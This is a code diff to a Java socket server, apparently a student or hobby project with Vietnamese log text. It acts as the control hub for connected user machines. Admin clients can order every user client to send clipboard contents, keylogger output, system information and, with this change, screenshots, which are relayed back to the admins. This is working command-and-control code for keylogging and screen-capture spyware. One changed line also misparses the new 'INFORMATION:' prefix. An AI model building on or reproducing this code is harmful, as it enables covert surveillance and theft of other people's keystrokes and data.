@@ -14,11 +14,9 @@ import java.awt.*;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
-import java.io.IOException;
 import java.util.Base64;
 import javax.imageio.ImageIO;
 import java.io.File;
-
 
 public class Server {
     private static List<ClientHandler> userClients = new ArrayList<>();
@@ -56,6 +54,7 @@ public class Server {
                 BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                 String clientType = in.readLine();
                 String clientIP = clientSocket.getInetAddress().getHostAddress();
+                System.out.println("Địa chỉ IP của client: " + clientIP);
 
                 if ("USER".equals(clientType)) {
                     synchronized (userConnectedIPs) {
@@ -121,7 +120,7 @@ public class Server {
 
                 String inputLine;
                 while ((inputLine = in.readLine()) != null) {
-                    if (inputLine.startsWith("INFO:")) {
+                    if (inputLine.startsWith("INFORMATION:")) {
                         String info = clientName + ": " + inputLine.substring(5);
                         sendSystemInfoToAdmins(info);
                     } else if (inputLine.startsWith("CLIPBOARD:")) {
@@ -130,6 +129,9 @@ public class Server {
                     } else if (inputLine.startsWith("KEY:")) {
                         String info = clientName + ": " + inputLine.substring(4);
                         sendSystemInfoToAdmins(info);
+                    } else if (inputLine.startsWith("SCREENSHOT:")) {
+                        String base64Image = inputLine.substring(11);
+                        sendScreenshotToAdmins(base64Image);
                     }
                 }
             } catch (IOException e) {
@@ -160,6 +162,14 @@ public class Server {
                 }
             }
         }
+
+        public void sendScreenshotToAdmins(String base64Image) {
+            synchronized (systemInfo) {
+                for (AdminHandler admin : adminClients) {
+                    admin.sendScreenshot(base64Image);
+                }
+            }
+        }
     }
 
     private static class AdminHandler implements Runnable {
@@ -178,19 +188,19 @@ public class Server {
                 BufferedReader in = new BufferedReader(new InputStreamReader(adminSocket.getInputStream()));
 
                 String clientMessage;
-                while ((clientMessage  = in.readLine()) != null) {
-                    if ("information".equalsIgnoreCase(clientMessage )) {
+                while ((clientMessage = in.readLine()) != null) {
+                    if ("INFORMATION".equalsIgnoreCase(clientMessage)) {
                         systemInfo.setLength(0);
                         for (ClientHandler user : userClients) {
-                            user.sendCommand("information");
+                            user.sendCommand("INFORMATION");
                         }
                         try {
-                            Thread.sleep(2000);
+                            Thread.sleep(3000);
                         } catch (InterruptedException e) {
                             e.printStackTrace();
                         }
                         sendSystemInfoToAdmin();
-                    } else if ("clipboard".equalsIgnoreCase(clientMessage )) {
+                    } else if ("clipboard".equalsIgnoreCase(clientMessage)) {
                         systemInfo.setLength(0);
                         for (ClientHandler user : userClients) {
                             user.sendCommand("clipboard");
@@ -201,7 +211,7 @@ public class Server {
                             e.printStackTrace();
                         }
                         sendSystemInfoToAdmin();
-                    } else if ("keylogger".equalsIgnoreCase(clientMessage )) {
+                    } else if ("keylogger".equalsIgnoreCase(clientMessage)) {
                         systemInfo.setLength(0);
                         for (ClientHandler user : userClients) {
                             user.sendCommand("keylogger");
@@ -212,22 +222,22 @@ public class Server {
                             e.printStackTrace();
                         }
                         sendSystemInfoToAdmin();
-                    }  if (clientMessage.startsWith("USER")) {
-                    // Handle user connection
-                    System.out.println("User connected.");
-                } else if (clientMessage.startsWith("SCREENSHOT:")) {
-                    String base64Image = clientMessage.substring("SCREENSHOT:".length());
-                    BufferedImage image = decodeFromBase64(base64Image);
-                    if (image != null) {
-                        // Process the received screenshot
-                        System.out.println("Received screenshot.");
-                        // Optionally save the image to a file
-                        ImageIO.write(image, "png", new File("screenshot.png"));
-                    } else {
-                        System.out.println("Failed to decode the image.");
+                    } else if (clientMessage.startsWith("USER")) {
+                        // Handle user connection
+                        System.out.println("User connected.");
+                    } else if (clientMessage.startsWith("SCREENSHOT:")) {
+                        String base64Image = clientMessage.substring("SCREENSHOT:".length());
+                        BufferedImage image = decodeFromBase64(base64Image);
+                        if (image != null) {
+                            // Process the received screenshot
+                            System.out.println("Received screenshot.");
+                            // Optionally save the image to a file
+                            ImageIO.write(image, "png", new File("screenshot.png"));
+                        } else {
+                            System.out.println("Failed to decode the image.");
+                        }
                     }
                 }
-            }
             } catch (IOException e) {
                 System.err.println("Error: " + e.getMessage());
             } finally {
@@ -256,21 +266,22 @@ public class Server {
                 out.println(info);
             }
         }
-        public void sendScreenshot(byte[] imageData) {
-             if (out != null) {
-               out.println("SCREENSHOT:" + Base64.getEncoder().encodeToString(imageData));
-    }
-}
-         private BufferedImage decodeFromBase64(String base64Image) {
-        try {
-            byte[] imageBytes = Base64.getDecoder().decode(base64Image);
-            ByteArrayInputStream bis = new ByteArrayInputStream(imageBytes);
-            return ImageIO.read(bis);
-        } catch (IOException e) {
-            e.printStackTrace();
-            return null;
-        }
-    }
 
+        public void sendScreenshot(String base64Image) {
+            if (out != null) {
+                out.println("SCREENSHOT:" + base64Image);
+            }
+        }
+
+        private BufferedImage decodeFromBase64(String base64Image) {
+            try {
+                byte[] imageBytes = Base64.getDecoder().decode(base64Image);
+                ByteArrayInputStream bis = new ByteArrayInputStream(imageBytes);
+                return ImageIO.read(bis);
+            } catch (IOException e) {
+                e.printStackTrace();
+                return null;
+            }
+        }
     }
 }
